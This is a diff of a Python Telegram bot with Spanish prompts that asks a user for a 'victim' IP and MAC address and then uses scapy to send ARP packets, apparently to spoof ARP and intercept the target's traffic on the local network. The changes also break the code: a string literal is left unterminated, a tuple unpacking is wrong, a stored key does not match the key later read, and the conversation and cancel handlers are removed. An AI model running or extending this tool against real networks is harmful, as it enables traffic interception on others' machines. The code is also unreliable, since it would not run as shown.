@@ -9,7 +9,7 @@ from scapy.all import ARP, Ether, send, srp
 
 a = 1
 
-IP = range(1)
+IP, MAC = range(4)
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
@@ -36,11 +36,24 @@ def attack(update, context):
 
     reply_keyboard = [['/cancel']]
     update.message.reply_text(
-        '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
+        '¿Cuál es la dirección IP de su víctima?
         reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
     )
 
     return IP
+  
+def set_mac_victima(update, context):
+    """Recibe la MAC de la víctima"""
+
+    context.user_data['mac_victima'] = update.message.text
+
+    reply_keyboard = [['/cancel']]
+    update.message.reply_text(
+        '¿Cuál es la dirección IP de su gateway? (Escriba "/cancel" para cancelar la petición)',
+        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
+    )
+
+    return MAC
 
 
 def set_ip(update, context):
@@ -52,8 +65,11 @@ def set_ip(update, context):
     gateway_ip = "192.168.75.1"
     gateway_mac = "00:50:56:C0:00:08"
     
-    target_ip = ip
-    target_mac = "00:0C:29:A0:F7:39"
+    target_ip = context.user_data['ip']
+    target_mac = context.user_data['mac']
+    
+    print(target_ip)
+    print(target_mac)
 
     arp = ARP(pdst=target_ip)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -73,24 +89,6 @@ def set_ip(update, context):
 
     return ConversationHandler.END
 
-
-def cancel(update, context):
-    """Cancela la petición actual"""
-
-    update.message.reply_text('Operación cancelada')
-
-    return ConversationHandler.END
-
-
-conv_handler = ConversationHandler(
-    entry_points=[CommandHandler('attack', attack)],
-
-    states={
-        IP: [MessageHandler(None, set_ip)]
-    },
-
-    fallbacks=[MessageHandler(None, cancel)]
-)
 
 def main():
     """Se inicia el bot"""
